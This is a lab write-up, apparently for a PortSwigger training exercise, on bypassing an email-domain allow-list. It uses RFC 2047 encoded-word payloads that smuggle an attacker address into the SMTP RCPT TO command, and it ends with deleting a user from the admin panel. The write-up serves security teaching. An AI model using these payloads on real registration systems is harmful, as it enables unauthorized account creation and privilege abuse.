# Bypassing access controls using email address parsing discrepancies

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies), you'll learn: Bypassing access controls using email address parsing discrepancies! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

This lab validates email addresses to prevent attackers from registering addresses from unauthorized domains. There is a parser discrepancy in the validation logic and library used to parse email addresses.

To solve the lab, exploit this flaw to register an account and delete `carlos`.

## Enumeration

Register page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203135351.png)

In here, we can see that it's using **domain `ginandjuice.shop` as the whitelisted domain**.

We can try to register an account with a non whitelisted email domain:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203135749.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203135830.png)

As expected, only domain `ginandjuice.shop` is allowed.

Hmm... Can we bypass that validation?

Some websites parse email addresses to extract the domain and determine which organization the email owner belongs to. While this process may initially seem straightforward, it is actually very complex, even for valid RFC-compliant addresses.

Discrepancies in how email addresses are parsed can undermine this logic. These discrepancies arise when different parts of the application handle email addresses differently.

An attacker can exploit these discrepancies using encoding techniques to disguise parts of the email address. This enables the attacker to create email addresses that pass initial validation checks but are interpreted differently by the server's parsing logic.

The main impact of email address parser discrepancies is unauthorized access. Attackers can register accounts using seemingly valid email addresses from restricted domains. This enables them to gain access to sensitive areas of the application, such as admin panels or restricted user functions.

If we read whitepaper [Splitting the Email Atom: Exploiting Parsers to Bypass Access Controls](https://portswigger.net/research/splitting-the-email-atom) by Gareth Heyes, we can try to bypass the whitelisted email domain.

More specifically, we can try to use **encoded-word**, which is defined in [RFC 2047 section 2](https://datatracker.ietf.org/doc/html/rfc2047#section-2).

To test the email parser supports encoded-word, we can try to probe for it, such as this:

```
=?utf-8?q?=41=41=41=41?=foobar@exploit-0ac2002e03c9d0f280d00cad01a10080.exploit-server.net
```

- `=?`: Start of encoded-word
- `utf-8`: Character set
- `?`: Separators
- `q`: Type of encoding, `q` means "Q-Encoding"
- `=41`: Hex encoded character `A`
- `?=`: End of encoded-word

If the email parser supports encoded-word, the email's username will be `AAAAfoobar`. Let's try it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203140117.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203140145.png)

Huh, now we got "Registration blocked for security reasons".

After some testing, we can see that the email parser did support encoded-word. However, we cannot use Q-Encoding. Luckily, we can bypass that using base64 encoding:

```
=?utf-8?b?QUFBQQ==?=foobar@exploit-0ac2002e03c9d0f280d00cad01a10080.exploit-server.net
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203140743.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203140759.png)

## Exploitation

Armed with the above information, we now know that the application's email parser supports encoded-word, which means we can try to leverage that to bypass the email domain whitelist!

According to the [Splitting the Email Atom](https://portswigger.net/research/splitting-the-email-atom) research blog post, we can try to do that with base64 encode our attacker email address `attacker@exploit-[...].exploit-server.net`, and let the email parser to base64 decode the encoded-word.

Moreover, we can also inject our own `RCPT TO` command in the SMTP conversation. Imagine the following normal `RCPT TO` SMTP command:

```
RCPT TO "foobar@ginandjuice.shop"
```

Since encoded-word is supported, we can inject our own payload to trick the `RCPT TO` command to send the email to a different domain, such as this:

Input:

```
=?utf-8?b?YXR0YWNrZXJAZXhwbG9pdC0wYWMyMDAyZTAzYzlkMGYyODBkMDBjYWQwMWExMDA4MC5leHBsb2l0LXNlcnZlci5uZXQg?=foobar@ginandjuice.shop
```

Original base64 encoded string:

```
attacker@exploit-0ac2002e03c9d0f280d00cad01a10080.exploit-server.net<space_character_here>
```

Output:

```
RCPT TO "attacker@exploit-0ac2002e03c9d0f280d00cad01a10080.exploit-server.net foobar@ginandjuice.shop"
```

By doing this, we could trick the SMTP to send the email to our attacker email address.

Let's use the above input payload to bypass the whitelisted domain!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203142435.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203142455.png)

Email client:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203142513.png)

Nice! We successfully bypassed it! Let's click the link to activate the account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203142609.png)

And login to our new account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203142632.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203142649.png)

Finally go to the "Admin panel" and delete user `carlos`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203142752.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-12/images/Pasted%20image%2020241203142809.png)

## Conclusion

What we've learned:

1. Bypassing access controls using email address parsing discrepancies